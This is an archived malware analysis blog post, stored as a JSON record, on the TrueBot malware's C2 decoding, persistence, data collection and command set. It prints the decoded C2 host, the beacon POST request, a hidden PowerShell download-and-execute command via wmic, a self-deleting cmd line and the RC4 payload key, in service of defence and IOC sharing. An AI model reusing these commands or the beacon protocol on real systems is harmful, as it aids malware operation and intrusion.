{
    "id": "6068915a-f4e8-49b3-9aaa-29c0a6a0d768",
    "created_at": "2023-05-06T02:08:44.790738Z",
    "updated_at": "2025-03-27T02:05:50.078296Z",
    "deleted_at": null,
    "sha1_hash": "9314c6b3dce62dc9182be17e0d60615af8b4e4d5",
    "title": "2023-03-31 - TrueBot Analysis Part III - Capabilities",
    "authors": "",
    "file_creation_date": "2023-05-05T01:45:43Z",
    "file_modification_date": "2023-05-05T01:45:43Z",
    "file_size": 8307939,
    "plain_text": "# TrueBot Analysis Part III - Capabilities\n\n**[malware.love/malware_analysis/reverse_engineering/2023/03/31/analyzing-truebot-capabilities.html](https://malware.love/malware_analysis/reverse_engineering/2023/03/31/analyzing-truebot-capabilities.html)**\n\n31 Mar 2023 » [malware_analysis,](https://malware.love/category/malware_analysis) [reverse_engineering](https://malware.love/category/reverse_engineering)\n\n\nMarch 31, 2023\n\n\nAfter we have dealt with TrueBot’s packer in [Part I and](https://malware.love/malware_analysis/reverse_engineering/2023/02/12/analyzing-truebot-packer.html) [Part II, we can now finally analyze](https://malware.love/malware_analysis/reverse_engineering/2023/02/18/analyzing-truebot-static-unpacking.html)\nits core and see if we find something useful to extract in the next part.\n\nEvery unpacked sample I’ve seen so far looks pretty much identical. In this case, we’ll\n[analyze c042ad2947caf4449295a51f9d640d722b5a6ec6957523ebf68cddb87ef3545c.](https://bazaar.abuse.ch/sample/c042ad2947caf4449295a51f9d640d722b5a6ec6957523ebf68cddb87ef3545c/)\n\nAt the beginning there is a lot of stuff going on that I haven’t analyzed and probably never\nwill because it seems like it’s just garbage. The interesting part starts further down (marked\nred in the figure below):\n\n\n-----\n\nFortunately, TrueBot’s code is pretty well readable. There are no encrypted strings except\nthe C2. API calls are properly imported and referenced and there is no anti-analysis/debug\nfunctionality.\n\n## Get the C2\n\nRight at the start of the interesting code block, we can see three strings which look\nsuspicious. Two of them are obviously Base64 encoded strings and are passed as\narguments to the b64_decode() function, the other is passed as an argument to a function\nthat turns out to be a RC4 decryption function.\n\n\n-----\n\nBefore decrypting the Base64 decoded string, the string is passed to a function which I\ncalled mw_custom_decode. This function is really strange and I have no idea why the\nmalware author choose that way to custom encode/decode the C2 but anyway.\nWhen decoding the Base64 strings we get the following results:\n```\necho \"OSVlZSVmMCU4ZU9ZJTk3RC0lYjYlMGQlYWYlMDVYLg==\" | base64 -D\n\n9%ee%f0%8eOY%97D-%b6%0d%af%05X.\n\necho \"ZyVmZSVmNCU5YlklMDMlOTVNOQ==\" | base64 -D\n\ng%fe%f4%9bY%03%95M9\n\n```\nAfter putting the Base64 decoded string into the mw_custom_decode function, we get the\ndecoded bytes for the encrypted C2.\n```\n9%ee%f0%8eOY%97D-%b6%0d%af%05X. => 39 EE F0 8E 4F 59 97 44 2D B6 0D AF 05 58 2E\n\ng%fe%f4%9bY%03%95M9       => 67 fe f4 9b 59 03 95 4d 39\n\n```\nIn the next steps, TrueBot is RC4 decrypting both of the earlier decoded bytes.\n```\n39 EE F0 8E 4F 59 97 44 2D B6 0D AF 05 58 2E  => qweastradoc.com\n\n67 fe f4 9b 59 03 95 4d 39           => /gate.php\n\n## Persistence\n\n```\nBefore persisting itself, TrueBot creates a Mutex (IFjwi312fu321321rfewfew) to check if\nanother instance of itself is running, if so, it will terminate via ExitProcess(0).\n\n\n-----\n\nRight after creating the mutex, TrueBot tries to persist itself by creating a scheduled task via\na COM Interface.\n\nTrueBot supports both the Task Scheduler 1.0 and 2.0 API and therefore uses the\nrespective different CLSIDs.\n```\nTask Scheduler 1.0 API - Pre-Vista: ``148BD52A-A2AB-11CE-B11F-00AA00530503``\n\nTask Scheduler 2.0 API - Vista and higher: ``0F87369F-A4E5-4CFC-BD3E-73E6154572DD``\n\n```\nThe scheduled task is set up to run after each login and is configured to execute TrueBot\nvia rundll32.exe.\n\n## C2 Communication\n\n\n-----\n\nRight after persisting itself, TrueBot gathers information from the infected system which will\nbe sent to the C2. To get rid of “unwanted” processes, TrueBot filters those against a\nhardcoded list of keywords.\n\n\n-----\n\n-----\n\nAll other collected process names are then concatenated with | as a delimiter and stored\ninto a buffer.\n\nAfter collecting the processes, TrueBot searches for the existence of files with the file\nextension .JSONIP. If there is no such file, it will be created with a random 13 character\nalphabetical name for example C:\\ProgramData\\QdJLLvdcYfqmK.JSONIP. TrueBot will then\ncreate a new GUID with the following formula:\n```\nwsprintfA(buffer, \"%08x-%08x\", pguid.Data3 + pguid.Data1 * pguid.Data2, pguid.Data1\n* pguid.Data2 - pguid.Data3);\n\n```\nand write it into the newly created file. The GUID and the previously collected processes are\ncombined into a string, which is then URL encoded. The result before the URL encoding\nlooks like this:\n\nThe URL encoded data is then encoded with Base64 and sent to the C2 on port 80 with a\nself crafted HTTP Request:\n\n\n-----\n\nAfter sending the initial data to the C2, TrueBot performs some kind of connectivity check by\ntrying to connect to google.com. If it fails, it will try again after one second unless it is\nsuccessful.\n\nWhen successful, TrueBot is trying to get the victims DNS domain and the hostname by\ncalling GetComputerNameExA() twice.\n\n\n-----\n\nIn the last step before sending data to the C2, TrueBot tries to identify the operating system\nversion via GetVersionExA() and depending on the VersionInformation, it just returns a\nnumber which is then used as an index for a hardcoded OS Version array:\n\nFinally, TrueBot constructs the data string which will be sent to the C2:\n\n\n-----\n\nLike the collected processes earlier, the string will be URL and Base64 encoded and send\nto the C2 with the following post request:\n```\nPOST /gate.php HTTP/1.0\\r\\n\n\nHost: qweastradoc.com\\r\\n\n\nContent-type: application/x-www-form-urlencoded\\r\\n\n\nContent-length: 116\\r\\n\n\n\\r\\n\n\nbiUzZGQ2MDQzYmYyLWQ2MDNhMjlhJTI2byUzZFdJTjEwJTI2YSUzZDY0JTI2dSUzZFdPUktHUk9VUCUyNnAl\nM2RERVNLVE9QLTEyT0tCSEklMjZkJTNk\n\n```\nAfter sending the POST request, TrueBot is expecting one of the following commands from\nthe C2:\n```\nKLLS\n\nPS1\n\nSHC\n\nS64\n\n```\nThe commands PS1, SHC and S64 will only be executed if there is a “http” string in front of\nthem, for example:\n```\nhttp|PS1\n\n```\nI’m not sure if this is intended by the author and how the real response from the C2 looks\nlike but at least during debugging, this seems to work, see the following image:\n```\nKLLS: Terminates itself via cmd.exe for example C:\\WINDOWS\\system32\\cmd.exe /c del\nC:\\Users\\user\\Desktop\\tbot.dll >> NUL \n\n```\n\n-----\n\n```\nPS1: Download and execute a Powershell script via wmic.exe e.g. wmic.exe process\ncall create \"powershell -executionpolicy bypass -nop -w hidden %s\"\nSHC: Download and execute Shellcode\nS64: Download and execute Shellcode with higher privileges (if possible)\n\n```\nFor the commands PS1, SHC and S64, the received Payload from the C2 will first be\ndecrypted with RC4 again but this time with another RC4 key, in this case OfgjkwsikhU23.\n\nIn the next blogpost, we’ll do some more coding again and write a config extractor that\nextracts the most important artifacts from the binary. Stay tuned.\n\n_IOCs:_\n```\nc042ad2947caf4449295a51f9d640d722b5a6ec6957523ebf68cddb87ef3545c\n\nqweastradoc[.]com\n\n```\n**Related Posts**\n\n[TrueBot Analysis Part II - Static unpacker (Categories:](https://malware.love/malware_analysis/reverse_engineering/2023/02/18/analyzing-truebot-static-unpacking.html) [malware_analysis,](https://malware.love/category/malware_analysis.html)\n[reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[TrueBot Analysis Part I - A short glimpse into packed TrueBot samples (Categories:](https://malware.love/malware_analysis/reverse_engineering/2023/02/12/analyzing-truebot-packer.html)\n[malware_analysis,](https://malware.love/category/malware_analysis.html) [reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[Python stealer distribution via excel maldoc (Categories:](https://malware.love/malware_analysis/reverse_engineering/2021/05/19/unknown-python-stealer.html) [malware_analysis,](https://malware.love/category/malware_analysis.html)\n[reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[Having fun with an Ursnif VBS dropper (Categories:](https://malware.love/malware_analysis/reverse_engineering/2020/11/27/analyzing-a-vbs-dropper.html) [malware_analysis,](https://malware.love/category/malware_analysis.html)\n[reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[Trickbot tricks again [UPDATE] (Categories: malware_analysis,](https://malware.love/malware_analysis/reverse_engineering/2020/11/22/trickbot-fake-ips-part2.html) [reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[Trickbot tricks again (Categories:](https://malware.love/malware_analysis/reverse_engineering/2020/11/17/trickbots-latest-trick.html) [malware_analysis,](https://malware.love/category/malware_analysis.html) [reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n\n[« TrueBot Analysis Part II - Static unpacker](https://malware.love/malware_analysis/reverse_engineering/2023/02/18/analyzing-truebot-static-unpacking.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-31 - TrueBot Analysis Part III - Capabilities.pdf"
    ],
    "report_names": [
        "2023-03-31 - TrueBot Analysis Part III - Capabilities.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1683338924,
    "ts_updated_at": 1743041150,
    "ts_creation_date": 1683251143,
    "ts_modification_date": 1683251143,
    "files": {
        "pdf": "https://archive.orkl.eu/9314c6b3dce62dc9182be17e0d60615af8b4e4d5.pdf",
        "text": "https://archive.orkl.eu/9314c6b3dce62dc9182be17e0d60615af8b4e4d5.txt",
        "img": "https://archive.orkl.eu/9314c6b3dce62dc9182be17e0d60615af8b4e4d5.jpg"
    }
}